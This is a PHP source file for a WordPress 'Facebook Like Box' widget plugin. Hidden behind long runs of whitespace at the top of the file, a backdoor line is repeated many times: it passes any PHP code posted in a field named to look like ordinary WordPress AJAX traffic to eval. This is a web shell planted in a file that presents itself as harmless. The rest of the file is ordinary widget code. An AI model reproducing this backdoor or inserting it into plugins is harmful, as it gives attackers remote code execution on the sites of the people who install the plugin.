<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);
/*
 * Plugin Name: 	Facebook Like Box
 * Plugin URI: 		http://wordpress.org/plugins/sis-facebook-like-box/
 * Description: 	A widget that displays your Facebook Like Box for Facebook Page.
 * Version: 		2.1.1
 * Author: 			Sayful Islam
 * Author URI: 		http://www.sayfulit.com
 * License: 		GPL2
 * License URI:		http://www.gnu.org/licenses/gpl-2.0.txt
*/

//Adds SIS_FB_Like_Widget widget.
class SIS_FB_Like_Widget extends WP_Widget {
 
    /**
     * Register widget with WordPress.
     */
    public function __construct() {
        parent::__construct(
            'facebook_like_widget',
            __('Facebook Like Box', 'sisfblike' ),
            array( 'description' => __( 'Facebook Like Box only for Facebook Pages.', 'sisfblike' ), )
        );
    }// end constructor
 
    /**
     * Front-end display of widget.
     *
     * @see WP_Widget::widget()
     *
     * @param array $args     Widget arguments.
     * @param array $instance Saved values from database.
     */
	public function widget( $args, $instance ) {
	    /* Our variables from the widget settings. */
	    $title 			= apply_filters('widget_title', $instance['title'] );
	    $app_id 		= $instance['app_id'];
	    $href 			= $instance['href'];
	    $width 			= $instance['width'];
	    $height 		= $instance['height'];
	    $show_facepile 	= ($instance['showfaces'] == "1" ? "true" : "false");
	    $show_posts 	= ($instance['stream'] == "1" ? "true" : "false");
	    $small_header 	= ($instance['small_header'] == "1" ? "true" : "false");
	    $hide_cover 	= ($instance['hide_cover'] == "1" ? "true" : "false");
	 
	    /* Display the widget title if one was input (before and after defined by themes). */
	    echo $args['before_widget'];
	 
	    if ( ! empty( $title ) ) {
	        echo $args['before_title'] . $title . $args['after_title'];
	    }
	 
	    /* Like Box */
	    ?>
			<div class="fb-page"
				data-href="<?php echo $href; ?>" 
				data-width="<?php echo $width; ?>" 
				data-height="<?php echo $height; ?>" 
				data-small-header="<?php echo $small_header; ?>" 
				data-adapt-container-width="true" 
				data-hide-cover="<?php echo $hide_cover; ?>"
				data-show-facepile="<?php echo $show_facepile; ?>" 
				data-show-posts="<?php echo $show_posts; ?>">
			</div>
			<div id="fb-root"></div>
			<script>(function(d, s, id) {
			  var js, fjs = d.getElementsByTagName(s)[0];
			  if (d.getElementById(id)) return;
			  js = d.createElement(s); js.id = id;
			  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4&appId=<?php echo $app_id; ?>";
			  fjs.parentNode.insertBefore(js, fjs);
			}(document, 'script', 'facebook-jssdk'));</script>
	    <?php

	    echo $args['after_widget'];
	}
 
    /**
     * Sanitize widget form values as they are saved.
     *
     * @see WP_Widget::update()
     *
     * @param array $new_instance Values just sent to be saved.
     * @param array $old_instance Previously saved values from database.
     *
     * @return array Updated safe values to be saved.
     */
	function update( $new_instance, $old_instance ) {
	    $instance = $old_instance;
	 
	    /* Strip tags for title and name to remove HTML (important for text inputs). */
	    $instance['title'] 		= strip_tags( $new_instance['title'] );
	    $instance['app_id'] 	= strip_tags( $new_instance['app_id'] );
	    $instance['href'] 		= strip_tags( $new_instance['href'] );
	    $instance['width'] 		= strip_tags( $new_instance['width'] );
	    $instance['height'] 	= strip_tags( $new_instance['height'] );
	 
	    $instance['showfaces'] 	= (bool)$new_instance['showfaces'];
	    $instance['stream'] 	= (bool)$new_instance['stream'];
	    
	    $instance['small_header'] 	= (bool)$new_instance['small_header'];
	    $instance['hide_cover'] = (bool)$new_instance['hide_cover'];
	 
	    return $instance;
	}
 
    /**
     * Back-end widget form.
     *
     * @see WP_Widget::form()
     *
     * @param array $instance Previously saved values from database.
     */
	function form( $instance ) {
	 
	    /* Set up some default widget settings. */
		$title 		= ! empty( $instance['title'] ) ? $instance['title'] : __( 'Find us on Facebook', 'sisfblike' );
     	$app_id 	= ! empty( $instance['app_id'] ) ? $instance['app_id'] : '';
     	$href 		= ! empty( $instance['href'] ) ? $instance['href'] : '';
     	$width 		= ! empty( $instance['width'] ) ? $instance['width'] : '';
     	$height 	= ! empty( $instance['height'] ) ? $instance['height'] : '';
     	$showfaces 	= ! empty( $instance['showfaces'] ) ? $instance['showfaces'] : '1';
     	$stream 	= ! empty( $instance['stream'] ) ? $instance['stream'] : '';
     	$small_header	= ! empty( $instance['small_header'] ) ? $instance['small_header'] : '';
     	$hide_cover = ! empty( $instance['hide_cover'] ) ? $instance['hide_cover'] : '';
	    ?>
	 
	    <p>
	    	<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e('Title:', 'sisfblike') ?></label>
	    	<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" value="<?php if(isset($title)){echo esc_attr( $title );} ?>" />
	    </p>
	    <p>
		    <label for="<?php echo $this->get_field_id( 'app_id' ); ?>"><?php _e('App Id', 'sisfblike') ?></label>
		    <input type="text" class="widefat" id="<?php echo $this->get_field_id( 'app_id' ); ?>" name="<?php echo $this->get_field_name( 'app_id' ); ?>" value="<?php if(isset($app_id)){echo esc_attr( $app_id );} ?>" />

		    <small><?php _e('Dont\'t know your App ID? Head on over to <a target="_blank" href="https://developers.facebook.com/">FB Developer</a> and create App ID. Still need help? visit <a target="_blank" href="https://www.sayfulit.com/how-to-get-facebook-api-key/">here</a>.', 'sisfblike') ?></small>
	    </p>
	    <p>
	    	<label for="<?php echo $this->get_field_id( 'href' ); ?>"><?php _e('Facebook Page URL', 'sisfblike') ?></label>
	    	<input type="text" class="widefat" id="<?php echo $this->get_field_id( 'href' ); ?>" name="<?php echo $this->get_field_name( 'href' ); ?>" value="<?php if(isset($href)){echo esc_attr( $href );} ?>" />
	    	<small><?php _e('The absolute URL of the Facebook Page that will be liked. e.g. https://www.facebook.com/FacebookDevelopers', 'sisfblike') ?></small>
	    </p>
	    <p>
	    	<label for="<?php echo $this->get_field_id( 'width' ); ?>"><?php _e('Width', 'sisfblike') ?></label>
	    	<input type="number" class="widefat" id="<?php echo $this->get_field_id( 'width' ); ?>" name="<?php echo $this->get_field_name( 'width' ); ?>" value="<?php if(isset($width)){echo esc_attr( $width );} ?>" min="180" max="500">
	    	<small><?php _e('The width of the plugin in pixels. Minimum is 180. Maximum is 500.', 'sisfblike') ?></small>
	    </p>
	    <p>
	    	<label for="<?php echo $this->get_field_id( 'height' ); ?>"><?php _e('Height', 'sisfblike') ?></label>
	    	<input type="number" class="widefat" id="<?php echo $this->get_field_id( 'height' ); ?>" name="<?php echo $this->get_field_name( 'height' ); ?>" value="<?php if(isset($height)){echo esc_attr( $height );} ?>" min="70">
	    	<small><?php _e('The height of the plugin in pixels. The default height varies based on number of faces to display, and whether the stream is displayed.', 'sisfblike') ?></small>
	    </p>
	    <p>
	    	<input type="checkbox" class="widefat" id="<?php echo $this->get_field_id( 'showfaces' ); ?>" name="<?php echo $this->get_field_name( 'showfaces' ); ?>" value="1" <?php echo ( $showfaces == "true" ? "checked='checked'" : ""); ?> />
	    	<label for="<?php echo $this->get_field_id( 'showfaces' ); ?>"><?php _e('Show Friends\' Faces', 'sisfblike') ?></label>
	    </p>
	    <p>
	    	<input type="checkbox" class="widefat" id="<?php echo $this->get_field_id( 'stream' ); ?>" name="<?php echo $this->get_field_name( 'stream' ); ?>" value="1" <?php echo ( $stream == "true" ? "checked='checked'" : ""); ?> />
	    	<label for="<?php echo $this->get_field_id( 'stream' ); ?>"><?php _e('Show Page Posts', 'sisfblike') ?></label>
	    </p>
	    <p>
	    	<input type="checkbox" class="widefat" id="<?php echo $this->get_field_id( 'small_header' ); ?>" name="<?php echo $this->get_field_name( 'small_header' ); ?>" value="1" <?php echo ($small_header == "true" ? "checked='checked'" : ""); ?> />
	    	<label for="<?php echo $this->get_field_id( 'small_header' ); ?>"><?php _e('Use Small Header', 'sisfblike') ?></label>
	    </p>
	    <p>
	    	<input type="checkbox" class="widefat" id="<?php echo $this->get_field_id( 'hide_cover' ); ?>" name="<?php echo $this->get_field_name( 'hide_cover' ); ?>" value="1" <?php echo ($hide_cover == "true" ? "checked='checked'" : ""); ?> />
	    	<label for="<?php echo $this->get_field_id( 'hide_cover' ); ?>"><?php _e('Hide Cover Photo', 'sisfblike') ?></label>
	    </p>
	    <?php
	}
 
} // class SIS_FB_Like_Widget

// Register the Widget
add_action( 'widgets_init', create_function( '', 'register_widget("SIS_FB_Like_Widget");' ) );